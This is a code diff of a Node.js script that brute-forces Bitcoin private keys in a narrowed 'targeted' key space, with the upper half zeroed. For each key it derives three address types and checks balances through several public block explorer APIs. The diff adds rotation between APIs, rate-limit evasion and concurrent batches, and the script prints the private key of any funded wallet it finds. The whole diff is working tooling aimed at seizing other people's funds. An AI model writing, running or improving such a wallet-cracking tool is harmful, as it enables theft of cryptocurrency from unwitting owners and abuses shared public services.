@@ -49,67 +49,133 @@ const bitcoin = __importStar(require("bitcoinjs-lib"));
 const ecpair_1 = require("ecpair");
 const ecc = __importStar(require("tiny-secp256k1"));
 const axios_1 = __importDefault(require("axios"));
+const promises_1 = require("timers/promises");
 const ECPair = (0, ecpair_1.ECPairFactory)(ecc);
-// Generate a weak private key and return as Buffer
-function generateWeakPrivateKey() {
-    const weakKey = Buffer.alloc(32);
-    for (let i = 0; i < 32; i++) {
-        weakKey[i] = Math.floor(Math.random() * 256);
+const API_BASES = [
+    "https://blockstream.info/api",
+    "https://sochain.com/api/v2/address/BTC",
+    "https://api.blockcypher.com/v1/btc/main/addrs",
+];
+const httpClient = axios_1.default.create({ timeout: 10000 });
+class RateLimiter {
+    constructor() {
+        this.lastRequest = 0;
     }
-    return weakKey;
+    wait() {
+        return __awaiter(this, void 0, void 0, function* () {
+            const now = Date.now();
+            const delay = Math.max(2000 - (now - this.lastRequest), 500);
+            this.lastRequest = now + delay;
+            yield (0, promises_1.setTimeout)(delay);
+        });
+    }
 }
-function createAddressFromPrivateKey(privateKey) {
+const limiter = new RateLimiter();
+function generateTargetedPrivateKey() {
+    const key = Buffer.alloc(32);
+    key.fill(0, 0, 16);
+    for (let i = 16; i < 32; i++) {
+        key[i] = Math.floor(Math.random() * 256);
+    }
+    return key;
+}
+function createAddresses(privateKey) {
     const keyPair = ECPair.fromPrivateKey(privateKey);
     const pubKeyBuffer = Buffer.from(keyPair.publicKey);
-    const { address } = bitcoin.payments.p2pkh({ pubkey: pubKeyBuffer });
-    if (!address) {
-        throw new Error("Could not generate address.");
-    }
-    return address;
+    return [
+        bitcoin.payments.p2pkh({ pubkey: pubKeyBuffer }).address,
+        bitcoin.payments.p2sh({
+            redeem: bitcoin.payments.p2wpkh({ pubkey: pubKeyBuffer }),
+        }).address,
+        bitcoin.payments.p2wpkh({ pubkey: pubKeyBuffer }).address,
+    ];
 }
-// Function to check if the wallet has funds
-function checkWalletBalance(address) {
+function checkBalance(address) {
     return __awaiter(this, void 0, void 0, function* () {
-        try {
-            const response = yield axios_1.default.get(`https://blockchain.info/q/getreceivedbyaddress/${address}`);
-            return response.data;
-        }
-        catch (error) {
-            if (error.response) {
-                console.error(`Error checking balance for ${address}: ${error.response.status} ${error.response.data}`);
-            }
-            else if (error.request) {
-                console.error(`Error checking balance for ${address}: No response received.`);
-            }
-            else {
-                console.error(`Error checking balance for ${address}:`, error.message);
-            }
-            return 0; // Return 0 in case of error
-        }
-    });
-}
-// Main function to generate keys and check balance
-function main() {
-    return __awaiter(this, void 0, void 0, function* () {
-        while (true) {
+        var _a;
+        for (const baseUrl of API_BASES) {
+            yield limiter.wait();
             try {
-                const weakPrivateKey = generateWeakPrivateKey();
-                const address = createAddressFromPrivateKey(weakPrivateKey);
-                const balance = yield checkWalletBalance(address);
-                console.log(`Checked Address: ${address}, Balance: ${balance} satoshis`);
+                let balance = 0;
+                console.log(`Checking ${address} with ${baseUrl}`); //Added logging
+                if (baseUrl.includes("blockstream")) {
+                    const { data } = yield httpClient.get(`${baseUrl}/address/${address}`);
+                    balance =
+                        data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum;
+                }
+                else if (baseUrl.includes("sochain")) {
+                    const { data } = yield httpClient.get(`${baseUrl}/${address}`);
+                    balance = data.data.balance * 1e8;
+                }
+                else if (baseUrl.includes("blockcypher")) {
+                    const { data } = yield httpClient.get(`${baseUrl}/${address}`);
+                    balance = data.balance;
+                }
                 if (balance > 0) {
-                    console.log("\n🚀 Wallet with Funds Found!");
-                    console.log(`🔑 Private Key (Hex): ${weakPrivateKey.toString("hex")}`);
-                    console.log(`🏦 Address: ${address}`);
-                    console.log(`💰 Balance: ${balance} satoshis\n`);
-                    break; // Stop execution
+                    console.log(`Found Balance: ${balance} on ${address} using ${baseUrl}`); //logging
+                    return balance;
+                }
+                else {
+                    console.log(`Balance 0 on ${address} using ${baseUrl}`);
                 }
             }
             catch (error) {
-                console.error("An error occurred:", error);
+                if (((_a = error.response) === null || _a === void 0 ? void 0 : _a.status) === 429) {
+                    console.warn(`⚠️ Rate limit hit on ${baseUrl}. Retrying in 15s...`);
+                    yield (0, promises_1.setTimeout)(15000);
+                }
+                else {
+                    console.error(`Error with ${baseUrl}: ${error.message}`);
+                }
+            }
+        }
+        return 0;
+    });
+}
+function processBatch(batchSize) {
+    return __awaiter(this, void 0, void 0, function* () {
+        const batch = Array.from({ length: batchSize }, () => {
+            const privateKey = generateTargetedPrivateKey();
+            return { privateKey, addresses: createAddresses(privateKey) };
+        });
+        const results = yield Promise.all(batch.map((_a) => __awaiter(this, [_a], void 0, function* ({ privateKey, addresses }) {
+            for (const address of addresses) {
+                const balance = yield checkBalance(address);
+                if (balance > 0)
+                    return { privateKey, address, balance };
+            }
+            return null;
+        })));
+        return results.find((r) => r !== null) || null;
+    });
+}
+function main() {
+    return __awaiter(this, void 0, void 0, function* () {
+        const CONCURRENCY = 5;
+        const BATCH_SIZE = 3;
+        let checked = 0;
+        let startTime = Date.now();
+        setInterval(() => {
+            const elapsed = (Date.now() - startTime) / 1000;
+            console.log(`Checked ${checked} addresses (${(checked / elapsed).toFixed(2)}/s)`);
+        }, 5000);
+        while (true) {
+            const workers = Array.from({ length: CONCURRENCY }, () => __awaiter(this, void 0, void 0, function* () {
+                const result = yield processBatch(BATCH_SIZE);
+                checked += BATCH_SIZE * 3;
+                return result;
+            }));
+            for (const worker of workers) {
+                const found = yield worker;
+                if (found) {
+                    console.log("\n💰 FUNDED WALLET FOUND!");
+                    console.log(`🔑 Private Key: ${found.privateKey.toString("hex")}`);
+                    console.log(`🏦 Address: ${found.address}`);
+                    console.log(`💰 Balance: ${found.balance} satoshis\n`);
+                    process.exit(0);
+                }
             }
         }
     });
 }
-// Execute the main function
 main().catch(console.error);
